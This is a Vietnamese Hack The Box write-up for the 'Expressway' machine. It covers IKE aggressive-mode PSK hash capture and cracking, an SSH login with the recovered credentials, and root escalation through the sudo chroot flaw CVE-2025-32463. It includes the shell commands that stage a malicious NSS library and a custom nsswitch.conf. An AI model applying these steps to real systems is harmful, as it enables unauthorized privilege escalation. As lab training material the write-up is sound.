---
layout: post
title: "ExpressWay-HTB"
date: 2025-10-06 21:15:00 +0700
tags: redteam Machine-Easy
categories: jekyll update
--- 

# Expressway 

## Recon 

Đầu tiên, mình sẽ tiến hành scan địa chỉ IP: `10.10.11.87`

* Scan TCP port

![image](https://hackmd.io/_uploads/r1KIVjkall.png)

* Scan UDP port 

![image](https://hackmd.io/_uploads/SyHdjo1pxe.png)

**Tóm tắt**
- Mở TCP ssh, port 22 
- Mở UDP isakmp, port 500 

* Tìm hiểu thông tin về ứng dụng đang mở trên host

### SSH 

![image](https://hackmd.io/_uploads/ByUEzhJ6xg.png)

### ISAKMP

![image](https://hackmd.io/_uploads/SJ3EXn16ex.png)

Như vậy mình thử thực hiện khai thác **ISAKMP**

## Khai thác 

Theo thông tin ở trên thì **ISAKMP** sẽ làm nhiệm vụ thực hiện thiết lập thống nhất các giao thức, thuật toán mã hóa, xác thực,... 

Còn việc thực hiện trao đổi khóa sẽ do **IKE** đảm nhận. 

Sử dụng tool `ike-scan` với options `-M` là **Main Mode** nó sẽ trả về handshake.

![image](https://hackmd.io/_uploads/SkS6S3yaxx.png)

Tiếp tục dùng option `--aggressive` để nó trả về nhiều thông tin hơn như ID/KeyExchange/HASH_R. 

![image](https://hackmd.io/_uploads/HkNCUhJTxx.png)

Nhìn thấy có: 
- ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
- Hash(20 bytes)

Khai thác lấy hash dựa trên id `ike@expreesway.htb` sau đó ghi lại thông tin qua file với option `-P`

![image](https://hackmd.io/_uploads/rJnzOhkTlg.png)

Như vậy thì nó đã lưu hash vào trong file `psk.txt` 

![image](https://hackmd.io/_uploads/rJCNOhJagx.png)

Mình sẽ thử crack hash này. 

![image](https://hackmd.io/_uploads/r19tdhy6xg.png)

Tìm ra được password là **freakingrockstarontheroad**

Dùng credentials thu thập được là: `ike@freakingrockstarontheroad` login vào ssh. 

![image](https://hackmd.io/_uploads/HyVxKhy6ll.png)

Như vậy thì tiếp tục khai thác trên host này. 

![image](https://hackmd.io/_uploads/rJUFF2ypxl.png)

Nhìn thấy thì chưa leo lên được **root**
Giờ mình cần leo quyền. 

![image](https://hackmd.io/_uploads/r143h2yaxl.png)

Sau khi kiểm tra qua các lệnh trên thì nó không có thông tin gì. 
Nên mình thử tìm 1 file có ít nhất 1 quyền thực thi file thường sẽ là **root**

![image](https://hackmd.io/_uploads/SkAla3kTll.png)

Nhìn thấy thì có file `/usr/local/bin/sudo`. Sau khi, kiểm tra thì nó có version là **1.9.17**

![image](https://hackmd.io/_uploads/rJ7L62k6le.png)

Tìm thông tin trên mạng thì nó liên quan đến 1 **CVE-2025-32463**

![image](https://hackmd.io/_uploads/H1K202ypxe.png)

**Chi tiết lỗ hổng**: là một lỗ hổng nâng quyền cục bộ (local privilege escalation) trong sudo liên quan đến file `/etc/nsswitch.conf` — cụ thể là lỗ hổng liên quan đến tùy chọn --chroot (options -R) — cho phép người dùng thông thường leo lên quyền root trong một số điều kiện đặc biệt. 

### Các bước thực hiện nâng quyền 

1. Tạo 1 file **.so** (shared object) là file thư viện trong linux (giống như file dll trong windows) trong đó chứa 
`__attribute__((constructor))`  để có thể khởi chạy payload nâng quyền (nó là module NSS).
2. Xây dựng 1 chroot directory với `/etc/nsswitch.conf` mà mình đã custom (để khi hệ thống tra cứu tên, loader sẽ tìm thư viện đó trong chroot)
3. Đặt file **.so** đã biên dịch vào đúng tên và đường dẫn khớp với cấu trúc chroot (ví dụ `libnss_/exploit.so.2`)
4. Chạy **sudo** SUID bị vuln với tùy chọn chroot (ví dụ `--chroot`) đối với một lệnh vô hại; khi **sudo** load NSS bên trong chroot, constructor của **.so** độc hại sẽ chạy với quyền root.

### Xây dựng khai thác 

1. Chuẩn bị 1 file C payload (payload này dùng constructor để chạy khi **.so** được load lên): 

![image](https://hackmd.io/_uploads/S19vKBbTle.png)

2. Tiếp tục tạo 1 chroot directory layout và build share library:

```bash 
mkdir -p exploit_stage/fsociety/etc exploit_stage/libnss_
echo "passwd: /fsociety123" > exploit_stage/fsociety/etc/nsswitch.conf
cp /etc/group exploit_stage/fsociety/etc 
```

```bash 
# compile share object (từ directory bao gồm exploit.c)
gcc -shared -fPIC -Wl,-init,exploit -o exploit_stage/libnss_/fsociety.so.2 exploit.c
``` 

3. Sau đó, cuối cùng chạy **sudo** có lỗ hổng (ví dụ `/usr/local/bin/sudo` và sudo chroot option -R)

![image](https://hackmd.io/_uploads/HyM9xIWpex.png)

![image](https://hackmd.io/_uploads/r1M6eL-pgx.png)
